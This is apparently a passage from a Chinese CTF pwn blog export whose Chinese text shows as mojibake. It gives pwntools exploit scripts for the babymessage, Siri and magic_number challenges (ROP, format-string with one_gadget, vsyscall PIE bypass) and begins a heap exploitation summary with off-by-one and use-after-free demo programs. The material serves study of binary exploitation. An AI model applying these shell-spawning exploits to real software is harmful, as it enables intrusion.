ST14_4\n  __int64 v3; // [rsp+18h] [rbp-8h]\n\n  puts(\"message: \");\n  v1 = read(0, &v3, a1);\n  strncpy(buf, (const char *)&v3, v1);\n  buf[v1] = 0;\n  puts(\"done!\\n\");\n  return 0LL;\n}\n```\n\nè¿›å…¥leave_messageå‡½æ•°ï¼Œå‘ç°v3åœ¨rbp-8hçš„ä½ç½®ï¼Œå¯è¯»å…¥åˆå§‹é•¿åº¦ä¸º16ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼›\nä½†æº¢å‡ºè·ç¦»å¤ªçŸ­ï¼Œåªå¤Ÿè¦†ç›–rbpï¼Œä»¥è‡³äºæ ˆè¿ç§»éƒ½ä¸å¤Ÿã€‚\nå¯æ˜¯æƒ³ä¸€æƒ³ï¼Œa1æ˜¯å¯è¯»å…¥é•¿åº¦ï¼Œè‹¥æƒ³å¢åŠ é•¿åº¦å¿…ç„¶è¦æ”¹optionï¼Œè€Œoptionåœ¨å†…å­˜ä¸­çš„ä½ç½®å¾ˆå®‰å…¨ï¼Œæ²¡æœ‰å‡½æ•°å¯ä»¥ä¿®æ”¹åˆ°å®ƒï¼Œä¸”å‡½æ•°é™å®šäº†optionåªèƒ½ä¸º1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œå¹¶ä¸èƒ½æ”¹åˆ°å¾ˆå¤§çš„å€¼ï¼Œå› æ­¤è¿™æ¡è·¯æ˜¯èµ°ä¸é€šçš„æ˜¾ç„¶è¿™é¢˜åªèƒ½è¦†ç›–rbpï¼Œä½†æ˜¯æŠŠæ”¹åˆ°å“ªæ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œæ¯”èµ›æ—¶æˆ‘å°±è¢«å¡åˆ°è¿™ä¸ªæ­»èƒ¡åŒäº†ï¼Œå®åœ¨æƒ³ä¸é€šä¾¿å»åšSiriäº†\né‚£æœ¬é¢˜çš„å…³é”®åœ¨å“ªå‘¢ï¼Ÿåœ¨è¿™\n\n```\nif ( v1 > 256 )\n\tv1 = 256;\nleave_message(v1);\n```\n\nç¨‹åºåœ¨æ‰§è¡Œleave_messageä¹‹å‰ï¼Œå…ˆåˆ¤æ–­äº†ä¸€æ¬¡v1çš„å¤§å°(mm+16)ï¼Œå¦‚æœå¤§äº256ï¼Œåˆ™æŠŠå®ƒèµ‹å€¼ä¸º256\nå¦‚æœç¨‹åºæœ‰äº†åˆ¤æ–­æ¡ä»¶ï¼Œé‚£ä¹ˆä¸€å®šå­˜åœ¨ä¸v1ç›¸å…³çš„æŒ‡ä»¤ï¼Œè™½ç„¶æˆ‘å¾ˆä¸æƒ³ï¼Œä½†æ˜¯å¿…é¡»é‡‡å–ç»ˆæè§£å†³æ–¹æ¡ˆäº†â€”â€”çœ‹æ±‡ç¼–\n\n![](https://i.loli.net/2020/08/27/Hah95gr6A8m73tW.png)\n\næ‰€ä»¥è¦†ç›–rbpï¼Œä½¿å¾—rbp-4çš„å€¼æˆ‘ä»¬å¯æ§å³å¯ï¼Œè¿™å°±æ˜¯æœ¬é¢˜æœ€æ ¸å¿ƒçš„ç‚¹ã€‚\næ”¹åˆ°å“ªå‘¢ï¼Œnameæˆ‘ä»¬å¯å†™ï¼Œå°†rbpæ”¹åˆ°å®ƒé«˜4ä¸ªå­—èŠ‚å¤„ï¼Œä½¿å¾—name>256ï¼Œæ¥ä¸‹é¢å°±æ˜¯ç®€å•çš„ROPäº†\n\n## exp\n\n```python\n#coding:UTF-8\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = remote('123.56.170.202',21342)\nelf = ELF('./babymessage')\np = elf.process()\nlibc = ELF('./libc-2.27.so')\nwork_addr = elf.symbols['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nrdi_ret = 0x400ac3\npayload = 'A'*0x8+ p64(0x6010D4)\np.sendlineafter('choice:','1')\np.sendafter('name:',p32(0xf000050))\np.sendlineafter('choice:','2')\np.sendafter('message:',payload)\n#gdb.attach(p)\np.sendlineafter('choice:','2')\npayload_2 = 'A'*0x8\npayload_2 += p64(0x6010D4)\npayload_2 += p64(rdi_ret)\npayload_2 += p64(puts_got)\npayload_2 += p64(puts_plt)\npayload_2 += p64(work_addr)\np.sendlineafter('message:',payload_2)\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlibc_base = puts_addr- libc.sym['puts']\nlog.info('libc_base:'+hex(libc_base))\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\np.sendlineafter('choice:','1')\np.sendafter('name:',p32(0xf000050))\np.sendlineafter('choice:','2')\np.sendafter('message:',payload)\np.sendlineafter('choice:','2')\npayload = 'A' * 0x10\npayload += p64(libc_base+0x4f365)\np.sendafter('message:',payload)\np.interactive()\n```\n\nå¯æƒœå•Šå¯æƒœï¼Œæ„Ÿè§‰è¿™é¢˜åº”è¯¥æ˜¯å¯ä»¥åšçš„\n\n# 0x05 2020 å¼ºç½‘æ¯ Siri\n\nè¿™é¢˜è€ƒç‚¹æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæœ¬ä»¥ä¸ºéš¾ç‚¹æ˜¯è®¡ç®—åç§»ï¼Œæ²¡æƒ³åˆ°æ¯”èµ›æ—¶æˆ‘å¡åœ¨äº†è¿™æ ·ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹ï¼Œåˆæ²¡åšå‡ºæ¥ã€‚ã€‚åŸå› æ˜¯æ•°å¤ªå¤§äº†ï¼Œæ— æ³•ä½¿ç”¨fmtstr_payloadå†™åœ°å€\n\n![](https://i.loli.net/2020/08/28/Nd3jmAKI8S45pTZ.png)\n\nå…ˆçœ‹é¢˜ï¼Œæ‰“å¼€mainå‡½æ•°\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char s1; // [rsp+0h] [rbp-110h]\n  char v5; // [rsp+100h] [rbp-10h]\n  unsigned __int64 v6; // [rsp+108h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  memset(&s1, 0, 0x100uLL);\n  v5 = 0;\n  sub_11C5();\n  printf(\">>> \", a2);\n  while ( read(0, &s1, 0x100uLL) )\n  {\n    if ( !strncmp(&s1, \"Hey Siri!\", 9uLL) )\n    {\n      puts(\">>> What Can I do for you?\");\n      printf(\">>> \", \"Hey Siri!\");\n      read(0, &s1, 0x100uLL);\n      if ( !(unsigned int)sub_1326(&s1) && !(unsigned int)sub_12E4(&s1) && !(unsigned int)sub_1212(&s1) )\n        puts(\">>> Sorry, I can't understand.\");\n    }\n    memset(&s1, 0, 0x100uLL);\n    printf(\">>> \", 0LL);\n  }\n  return 0LL;\n}\n```\n\næœ¬é¢˜ä¿æŠ¤å…¨å¼€ï¼Œå…³é”®å‡½æ•°åœ¨è¿™é‡Œ\n\n```c\nsigned __int64 __fastcall sub_1212(const char *a1)\n{\n  char *v2; // [rsp+18h] [rbp-128h]\n  char s; // [rsp+20h] [rbp-120h]\n  unsigned __int64 v4; // [rsp+138h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  v2 = strstr(a1, \"Remind me to \");\n  if ( !v2 )\n    return 0LL;\n  memset(&s, 0, 0x110uLL);\n  sprintf(&s, \">>> OK, I'll remind you to %s\", v2 + 13);\n  printf(&s);\n  puts(&::s);\n  return 1LL;\n}\n```\n\nå®ƒæ˜¯å°†`Remind me to `åçš„å­—ç¬¦æ”¾åœ¨s[rbp-120h]å¤„ï¼Œç„¶åä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåªæœ‰è¿™ä¸€ä¸ªåˆ©ç”¨ç‚¹\n\næˆ‘çš„æ€è·¯æ˜¯æ³„éœ²libc_startå‡½æ•°å’Œæ ˆçš„åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºlibcåŸºå€ï¼Œç„¶åå°†è¿”å›åœ°å€æ”¹ä¸ºone_gadget\n\n## exp\n\nè¿™æ˜¯æˆ‘æ¯”èµ›æ—¶çš„expï¼Œç”±äºpwntoolsçš„fmt_payloadæ²¡æ³•ç”¨ï¼Œæˆ‘åˆåœ¨githubä¸Šæ‰¾äº†ä¸€ä¸ªè„šæœ¬FmtPayload\nä½†æ˜¯è¿˜æ˜¯å¤±è´¥äº†ï¼Œæˆ‘æ„Ÿè§‰æ€è·¯åº”è¯¥æ²¡é—®é¢˜ã€‚ã€‚è´¹è§£ï¼Œ\nç½‘ä¸Šåˆ°ç°åœ¨è¿˜æ²¡æœ‰å‡ºå¼ºç½‘æ¯pwnéƒ¨åˆ†çš„wpï¼Œå°±å…ˆæ”¾ç€ï¼Œç­‰ä¹‹åå‡ºäº†wpå†å›å¤´è§£å†³\n\n```python\n#coding=utf-8\nfrom pwn import *\nimport FmtPayload\nelf = ELF('./Siri')\nsh = process('./Siri')\n#sh = remote('114.116.54.89',10005)\ncontext.log_level = 'debug'\nlibc = ELF('libc.so.6')\npayload = 'Remind me to %46$pAAAA%83$p'\nsh.recvuntil('>>>')\nsh.sendline('Hey Siri!')\nsh.recvuntil('you?')\nsh.sendline(payload)\nprint payload\nsh.recvuntil(\"to \")\nstack = int(sh.recv(14).split('\\n')[0],16)\nprint 'stack:' + hex(stack)\nsh.recvuntil('AAAA')\nlibc_start240 = int(sh.recv(16).split('\\n')[0],16)\nprint 'libc_start240:' + hex(libc_start240)\nlibc_base = libc_start240 - 240 -libc.sym['__libc_start_main']\nprint 'libc_base:' + hex(libc_base)\none_gadget = libc_base + 0x10a45c\n#gdb.attach(sh)\ntar = stack - 0x118\nprint hex(tar)\nsh.recvuntil('>>>')\nsh.sendline('Hey Siri!')\nsh.recvuntil('you?')\npayload2 = FmtPayload.fmt_payload(10,tar,one_gadget,n=3,written=30,arch='amd64',typex='byte')\n\n#payload2 = fmtstr_payload(10,{stack-0x118:one_gadget})\nsh.sendline('Remind me to '+payload2)\n\nsh.interactive()\n```\n\nåç»­ï¼šé¢˜ç›®å·²è§£å‡ºï¼Œexpæä¸¢äº†ï¼Œå°±ä¸é‡å†™äº†ï¼Œä¸æ”¾äº†\n\n------\n\n# 0x06 DASCTF å…«æœˆèµ› magic_number\n\nä¸€é“100åˆ†çš„é¢˜æ²¡æ•´å‡ºæ¥ï¼Œåäº†\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char buf; // [rsp+0h] [rbp-30h]\n  int v5; // [rsp+2Ch] [rbp-4h]\n\n  sub_9A0();\n  v5 = rand();\n  if ( v5 == 0x12345678 )\n    system(\"/bin/sh\");\n  puts(\"Your Input :\");\n  read(0, &buf, 0x100uLL);\n  return 0LL;\n}\n```\n\nå°±è¿™å‡ è¡Œä»£ç ï¼Œè€Œä¸”è¿˜æœ‰åé—¨ï¼Œæ±‡ç¼–æ›´ç®€å•å°±ä¸è´´äº†\nä½†æ˜¯éš¾ç‚¹åœ¨äºé™¤äº†canaryä»¥å¤–ï¼Œä¿æŠ¤å…¨å¼€ï¼Œè¿™å°±æ„å‘³ç€shellcodeä¸èƒ½ç”¨ï¼Œgotè¡¨ä¸å¯ä¿®æ”¹ï¼Œæœ€è¦å‘½çš„æ˜¯åœ°å€éšæœºåŒ–ã€‚\n\nå¦‚æœv5==0x12345678ï¼Œé‚£ä¹ˆæ‰§è¡Œsystemï¼Œä½†æ˜¯éšæœºæ•°æ˜¯åœ¨readä¹‹å‰èµ‹ç»™v5çš„ï¼Œä¸”å‡½æ•°åªæ‰§è¡Œä¸€æ¬¡ï¼Œå®åœ¨æƒ³ä¸å‡ºåŠæ³•ã€‚\n\nç»ˆäºå¤§ä½¬èµ›åå‘äº†expï¼Œæˆ‘æ‰å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æŠ€å·§æ¥ç»•è¿‡PIEâ€”â€”åˆ©ç”¨vsyscall\n\nåœ¨å¤šæ¬¡è¿è¡Œç¨‹åºæ—¶ä½ ä¼šå‘ç°ï¼Œå½“æ‰€æœ‰åœ°å€éƒ½åœ¨éšæœºå˜åŒ–æ—¶ï¼Œæœ€ä¸‹é¢æœ‰ä¸ªvsyscallæ®µçš„åœ°å€ä¸€ç›´ç¨³å®šåœ¨`0xffffffffff600000-0xffffffffff601000`ï¼Œé‚£å®ƒåˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ\n\nå¯¹äºæŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚gettimeofdayæ¥è¯´ï¼Œç”±äºä»–ä»¬ç»å¸¸è¢«è°ƒç”¨ï¼Œä½†æ˜¯ç³»ç»Ÿè°ƒç”¨æ˜¯ç”¨æˆ·æ€åˆ°å†…æ ¸æ€åˆ°ç”¨æˆ·æ€çš„ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¼€é”€å¾ˆå¤§ï¼Œå¦‚æœæ¯æ¬¡è¢«è°ƒç”¨éƒ½è¦è¿™ä¹ˆæ¥å›æŠ˜è…¾ä¸€éï¼Œå°±ä¼šå˜æˆä¸€ä¸ªç´¯èµ˜ã€‚å› æ­¤ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscall.\n\nåŠ¨æ€è°ƒè¯•ï¼Œå‘ç°system('/bin/sh')çš„åœ°å€åœ¨è¿™é‡Œ\n\n![image-20200826003915368](https://i.loli.net/2020/08/26/bMVAd1lmrTgSs7O.png)\n\nè€Œåœ¨è¿™é‡Œï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªå¾ˆæ¥è¿‘çš„åœ°å€ï¼Œåªæ˜¯æœ€ä½å­—èŠ‚ä¸ç›¸åŒï¼Œå› æ­¤å¯ä»¥é€šè¿‡vsyscallæ»‘åŠ¨ç»•è¿‡ï¼Œè¦†ç›–è¿™é‡Œåœ°å€ï¼Œä»¥åŠ«æŒåˆ°ipã€‚\n\n![image-20200826004057378](https://i.loli.net/2020/08/26/JYSMiNmga8cCzTs.png)\n\n------\n\n## exp\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\ncontext.log_level = 'debug'\np=process('magic_number')\n#p=remote('183.129.189.60',10010)\nelf=ELF('magic_number')\nsleep(5)\npayload = 'B'*0x38+p64(0xFFFFFFFFFF600400)*4+'\\xA8'\n#gdb.attach(p)\np.send(payload)\n#pause()\np.interactive()\n```\n\nè®¡ç®—æœºä»€ä¹ˆè¾¹è§’éƒ½èƒ½åˆ©ç”¨å•Šï¼Œå­¦ä¹ äº†å­¦ä¹ äº†\n\n***Referenceï¼š***\n\n[pwnä¸­vsyscallçš„åˆ©ç”¨](http://blog.eonew.cn/archives/968)\n\n[x86 æ¶æ„ä¸‹ Linux çš„ç³»ç»Ÿè°ƒç”¨ä¸ vsyscall, vDSO](https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/)\n\n------\n\n# 0x07 å°ç»“\n\næ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘å¥½èœ\n\nè¿™éƒ½æ˜¯æˆ‘æ¯”èµ›æ²¡æƒ³å‡ºæ¥çš„é¢˜ç›®ï¼Œåšå‡ºæ¥çš„é¢˜ç›®ä¹Ÿéƒ½æ¯”è¾ƒæ°´ï¼Œå„ä½å¸ˆå‚…éƒ½æœ‰wpï¼Œæˆ‘å°±ä¸å†™äº†\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"å †æº¢å‡ºæ¼æ´åˆ©ç”¨æ€»ç»“","url":"/2020/08/06/Heap/","content":"\n# 0x00 å‰è¨€\n\nå†æ—¶ä¸‰å¤©çš„é€Ÿæˆï¼Œç»ˆäºæŠŠæŠ¥å‘Šä¸Šäº¤äº†ï¼›\n\nä¸è¿‡è¯è¯´å›æ¥ï¼Œå †å¯èƒ½æ˜¯åˆå­¦è€…æ¯”è¾ƒéš¾å•ƒçš„éª¨å¤´ï¼Œæ²¡ä»€ä¹ˆå›ºå®šåšæ³•ï¼Œå¤æ‚å¤šå˜ï¼›\n\nè¿™é‡Œè‡ªå·±è®°å½•ä¸€äº›æœ€åŸºæœ¬çš„çŸ¥è¯†ç‚¹\n\n------\n\nåæœŸå¾€é‡Œè¡¥å……ä¸€ç‚¹çŸ¥è¯†ç‚¹\n\n# 0x01 èƒŒæ™¯çŸ¥è¯†\n\nå †(heap)æ˜¯ä¸€ç§å…¨å±€çš„æ•°æ®ç»“æ„ï¼Œä¸»è¦æ˜¯æŒ‡ç”¨æˆ·åŠ¨æ€ç”³è¯·çš„å†…å­˜(å¦‚è°ƒç”¨mallocã€allocã€newç­‰å‡½æ•°)ï¼Œä¸åŒäºæ ˆçš„æ˜¯ï¼Œå †å…·æœ‰æ›´å¤šçš„çµæ´»æ€§ï¼Œå› æ­¤å †æ¼æ´çš„åˆ©ç”¨ä¹Ÿæ›´åŠ å¤æ‚ï¼Œæ›´åŠ é›¶æ•£ï¼Œåœ¨æ­¤æˆ‘æ€»ç»“ä¸€ä¸‹å †æº¢å‡ºæ¼æ´çš„å‡ ç§å¸¸è§çš„åˆ©ç”¨æ–¹æ³•ã€‚\n\nä»¥ä¸‹æ˜¯å­¦ä¹ å †æ‰€éœ€è¦æŒæ¡å¹¶ç†Ÿæ‚‰çš„åŸºæœ¬çŸ¥è¯†ç‚¹ã€‚\n\n1. glibc mallocä¸­ä¸‰ç§æœ€åŸºæœ¬çš„å †å—æ•°æ®ç»“æ„ï¼šheap_info, malloc_state, malloc_chunk;\n\n2. chunkå†…å­˜å—ç»“æ„åŠå„å­—æ®µåŠŸèƒ½;\n\n3. binsç±»å‹åŠç©ºé—²å†…å­˜å—çš„ç®¡ç†ç»„ç»‡æ–¹æ³•;\n\n4. malloc()ã€free()å·¥ä½œæµç¨‹ï¼›\n\n# 0x02 åŸºæœ¬æ¼æ´ç±»å‹\n\n### 1.å¸¸è§„å †æº¢å‡º\n\nå †ç¼“å†²åŒºæº¢å‡ºä¸æ ˆç¼“å†²åŒºæº¢å‡ºç±»ä¼¼ï¼ŒæŒ‡å †ä¸Šçš„ç¼“å†²åŒºè¢«å¡«å…¥è¿‡å¤šæ•°æ®ï¼Œå¯¼è‡´å †ä¸­å…¶ä»–æ•°æ®è¢«è¦†ç›–ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š\n\n(1)è¦†ç›–æœ¬å †å—å†…éƒ¨æ•°æ®ï¼Œé€šå¸¸å‘ç”Ÿåœ¨ç»“æ„ä½“ä¸­ï¼Œå¦‚æœç»“æ„ä½“ä¸­æ•°ç»„æº¢å‡ºï¼Œåˆ™è¦†ç›–åç»­å˜é‡ã€‚\n\n(2)è¦†ç›–åç»­å †å—æ•°æ®ï¼Œä¼šå½±å“åç»­å †å—çš„æ•°æ®ï¼Œç”šè‡³ç ´åå †å—ç»“æ„ã€‚\n\nå¯¹äºè¿™ä¸¤ç§æƒ…å†µå¯ä»¥ç±»æ¯”æ ˆæº¢å‡ºåŸç†ï¼Œæ²¡æœ‰å¤ªå¤šæŠ€å·§æ€§çš„çŸ¥è¯†ï¼Œä½†æ˜¯CTFä¸­ä¸ä¼šå‡ºç°å•çº¯åˆ©ç”¨å †æº¢å‡ºçš„é¢˜ç›®ï¼Œé€šå¸¸å¤šç§åŸºæœ¬æ¼æ´ä¼šç›¸äº’ç»“åˆï¼Œæ‰€ä»¥è¦æ±‚å¸¸è§åŸºæœ¬æ¼æ´ç±»å‹éƒ½è¦æŒæ¡å¹¶ä¸”èƒ½å¤Ÿçµæ´»ä½¿ç”¨ã€‚\n\n------\n\n\n\n### 2.Off By One\n\nç¼“å†²åŒºæº¢å‡ºçš„ä¸€ç§ï¼Œä½†æ˜¯æ¯”è¾ƒç‰¹æ®Šï¼Œåªèƒ½æº¢å‡º1ä¸ªå­—èŠ‚ã€‚\n\næœ‰ä¸¤ç§åˆ©ç”¨æ€è·¯ï¼š\n\n(1)  æº¢å‡ºå­—èŠ‚ä¸ºå¯æ§åˆ¶ä»»æ„å­—èŠ‚ï¼šé€šè¿‡ä¿®æ”¹å¤§å°é€ æˆå—ç»“æ„ä¹‹é—´å‡ºç°é‡å ï¼Œä»è€Œæ³„éœ²å…¶ä»–å—æ•°æ®ï¼Œæˆ–æ˜¯è¦†ç›–å…¶ä»–å—æ•°æ®ã€‚\n\n(2)  æº¢å‡ºå­—èŠ‚ä¸º NULL å­—èŠ‚ï¼šæº¢å‡ºçš„ä¸€ä¸ªå­—èŠ‚æ°å¥½è¦†ç›–ä¸‹ä¸€å †å—çš„sizeåŸŸçš„æœ€ä½ä½ï¼Œå°†PREV_INUSEä½ç½®0ï¼Œè¿™æ ·å‰å—ä¼šè¢«è®¤ä¸ºæ˜¯ free å—ã€‚è¿™æ—¶å¯ä»¥é€‰æ‹©ä½¿ç”¨ unlink æ–¹æ³•è¿›è¡Œå¤„ç†(åé¢å°†è¯¦ç»†ä»‹ç»)ï¼Œè¿™æ—¶ prev_size åŸŸå°±ä¼šå¯ç”¨ï¼Œå°±å¯ä»¥ä¼ªé€  prev_size ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚\n\nä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„off by oneçš„ç¨‹åºï¼š\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    char buffer[40]=\"\";\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\"Get Input\");\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n}\n```\n\nç¨‹åºå¾ˆç®€å•ï¼Œä½†å¹¶éå®‰å…¨ï¼Œé—®é¢˜åœ¨äºstrlen åœ¨è®¡ç®—é•¿åº¦çš„æ—¶å€™ä¸ä¼šæŠŠç»“æŸç¬¦ '\\x00' è®¡ç®—åœ¨å†…ï¼Œä½†strcpy åœ¨æ‹·è´çš„æ—¶å€™ä¼šæŠŠ '\\x00' ä¹Ÿç®—ä¸Šï¼Œæ‰€ä»¥å°±ä¼šé€ æˆ off by oneã€‚(forå¾ªç¯ä¸­ä¹Ÿæ¯”è¾ƒå¸¸è§)\n\nè°ƒè¯•ä¸€ä¸‹ï¼Œä¾¿äºç†è§£ï¼Œåœ¨mainå‡½æ•°ä¸‹æ–­ç‚¹ï¼Œç„¶åå•æ­¥åˆ°è¾“å…¥ä½ç½®ï¼ŒæŸ¥çœ‹ä¸€ä¸‹chunkæƒ…å†µï¼Œ\n\n![](https://i.loli.net/2020/07/23/1EsYTkOrwICQqng.png)\n\nå½“æˆ‘ä»¬è¾“å…¥24ä¸ªâ€™Aâ€™ä¹‹åï¼Œå¾ˆæ˜æ˜¾ä¸‹ä¸€ä½ä½å­—èŠ‚è¢«è¦†ç›–ä¸ºâ€™\\x00â€™\n\n![](https://i.loli.net/2020/07/23/qaxSFDMzu9iPpkT.png)\n\nNoteï¼šæœ‰ä¸€ä¸ªç‚¹è¦æ³¨æ„ï¼Œä¸ºä»€ä¹ˆç”³è¯·äº†24ä¸ªå­—èŠ‚ï¼Œchunkå¤§å°æ˜¯0x21å‘¢ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ºä»€ä¹ˆç”¨æˆ·æ•°æ®éƒ¨åˆ†å¤§å°åªæœ‰0x10?\n\nå…¶å®æ˜¯è¿™æ ·çš„ï¼Œå½“å‰ä¸€å †å—æ­£åœ¨ä½¿ç”¨æ—¶ï¼Œä¸‹ä¸€å †å—çš„prev_sizeä¹Ÿè¢«å½“ä½œæ•°æ®éƒ¨åˆ†(å¤§å°0x08)ï¼Œåªæœ‰å‰ä¸€å †å—freeæ—¶ï¼Œprev_sizeåŸŸæ‰æœ‰æ„ä¹‰ã€‚\n\n------\n\n### 3.Use After Free\n\nUse After Free(UAF)å³é‡Šæ”¾åä½¿ç”¨æ¼æ´ã€‚è‹¥å †æŒ‡é’ˆåœ¨é‡Šæ”¾åæœªç½®ç©ºï¼Œå½¢æˆæ‚¬æŒ‚æŒ‡é’ˆï¼Œå½“ä¸‹æ¬¡è®¿é—®è¯¥æŒ‡é’ˆæ—¶ï¼Œä¾ç„¶èƒ½å¤Ÿè®¿é—®åŸæŒ‡é’ˆæ‰€æŒ‡å‘çš„å †å†…å®¹ï¼Œå½¢æˆæ¼æ´ã€‚é€šå¸¸éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µåˆ†æï¼Œä»¥åˆ¤æ–­æ˜¯å¦å…·æœ‰ä¿¡æ¯æ³„éœ²å’Œä¿¡æ¯ä¿®æ”¹çš„åŠŸèƒ½ã€‚\n\nè¿™æ˜¯æ¯”èµ›æ—¶æœ€å¸¸è§„çš„ä¸€ç§æ–¹æ³•ï¼Œç»å¤§å¤šæ•°é¢˜ç›®éƒ½è¦å€ŸåŠ©å®ƒæ¥å®Œæˆï¼Œç®€å•æ¥è¯´å½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜é‡Šæ”¾ä¹‹åï¼Œæ²¡æœ‰è¿›è¡Œå†…å­˜å›æ”¶ï¼Œä¸‹æ¬¡ç”³è¯·çš„æ—¶å€™è¿˜èƒ½ç”³è¯·åˆ°è¿™ä¸€å—å†…å­˜ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ç”¨ä»¥å‰çš„å†…å­˜æŒ‡é’ˆæ¥è®¿é—®ä¿®æ”¹è¿‡çš„å†…å­˜ã€‚\n\nåŒæ ·ï¼Œç”¨ä¸€ä¸ª UAFçš„ç¨‹åºå±•ç¤ºç®€å•çš„æ¼æ´åˆ©ç”¨ï¼Œä»¥ä¾¿äºç†è§£ã€‚\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\ntypedef void (*func_ptr)(char *);\nvoid sys1(char command[])\n{\nsystem(command);\n}\nvoid echo(char content[])\n{\nprintf(\"%s\",content);\n}\nint main()\n{\n    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));//ç”³è¯·äº†4ä¸ªintå¤§å°çš„å†…å­˜\n    printf(\"malloc addr: %p\\n\",p1);//å› ä¸ºå‰2ä¸ªä¹Ÿå°±æ˜¯0x10æ˜¯ç”¨æ¥ç®¡ç†chunkçš„\n    p1[2]=echo;//æ‰€ä»¥ä»ç¬¬ä¸‰ä¸ªå¼€å§‹\n    p1[2](\"hello world\\n\");\n    free(p1); //åœ¨è¿™é‡Œfreeäº†p1,ä½†å¹¶æœªå°†p1ç½®ç©º,å¯¼è‡´åç»­å¯ä»¥å†ä½¿ç”¨p1æŒ‡é’ˆ\n    p1[2](\"hello again\\n\"); //p1æŒ‡é’ˆæœªè¢«ç½®ç©º,è™½ç„¶freeäº†,ä½†ä»å¯ä½¿ç”¨.\n    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));\n    //freeä¸€å—å†…å­˜å,å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„æŒ‡é’ˆä¼šæŠŠåˆšåˆšé‡Šæ”¾çš„å†…å­˜åˆ†é…å‡ºæ¥\n    printf(\"malloc addr: %p\\n\",p2);\n    printf(\"malloc addr: %p\\n\",p1);//p2ä¸p1æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜ä¸ºåŒä¸€åœ°å€\n    p2[2]=sys1; //åœ¨è¿™é‡Œå°†p1æŒ‡é’ˆé‡Œé¢ä¿å­˜çš„echoå‡½æ•°æŒ‡é’ˆè¦†ç›–æˆä¸ºäº†sys1æŒ‡é’ˆ.\n    p1[2](\"/bin/sh\");\n    return 0;\n}\n```\n\nå¾ˆæ˜æ˜¾ï¼Œp1,p2æŒ‡é’ˆæŒ‡å‘äº†åŒä¸€åœ°å€ï¼ŒåŸå› å°±æ˜¯p1è¢«é‡Šæ”¾åï¼Œæ”¾å…¥fastbinï¼Œå½“p2å†æ¬¡ç”³è¯·åŒæ ·å¤§å°çš„ç©ºé—´æ—¶ï¼Œç›´æ¥ä»fastbinä¸­å–å‡ºåˆšåˆšè¢«é‡Šæ”¾ã€ä¸”å¤§å°åˆé€‚çš„å†…å­˜ç©ºé—´ï¼ˆå³p1ï¼‰ï¼Œä»¥æé«˜åˆ†é…é€Ÿåº¦ï¼Œå¦‚æœç¨‹åºå‘˜ç²—å¿ƒå¤§æ„ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆäº†å¯ä»¥è¢«åˆ©ç”¨çš„UAFæ¼æ´ã€‚\n\n![](https://i.loli.net/2020/07/23/9iB4mYRT1dDb7tA.png)\n\næˆåŠŸè·å–shellã€‚\n\n------\n\n### 4.Double Free\n\nDouble Freeæ˜¯UAFè¾ƒä¸ºç‰¹æ®Šçš„ä¸€ç§ï¼Œä¹Ÿæ˜¯æ¯”èµ›ä¸­ç»å¸¸è¢«ä½¿ç”¨çš„åŸºæœ¬æ–¹æ³•ä¹‹ä¸€ï¼Œç®€å•çš„è¯´ï¼Œdouble freeæ˜¯ä»»æ„åœ°å€å†™çš„ä¸€ç§æŠ€å·§ï¼Œè¦ä¸å †ç®¡ç†çš„å…¶ä»–ç‰¹æ€§ç›¸ç»“åˆä½¿ç”¨ï¼Œå…ˆä¸è°ˆåˆ©ç”¨ï¼Œè¿™é‡Œæˆ‘åªæ˜¯ä»‹ç»ä¸€ä¸‹double freeæœ€åŸºç¡€çš„åŸç†ã€‚ä»¥fastbinä¸ºä¾‹ï¼Œfastbin æ˜¯ LIFO çš„æ•°æ®ç»“æ„ï¼Œä½¿ç”¨å•å‘é“¾è¡¨å®ç°ã€‚æ ¹æ®fastbin çš„ç‰¹æ€§ï¼Œé‡Šæ”¾çš„chunk 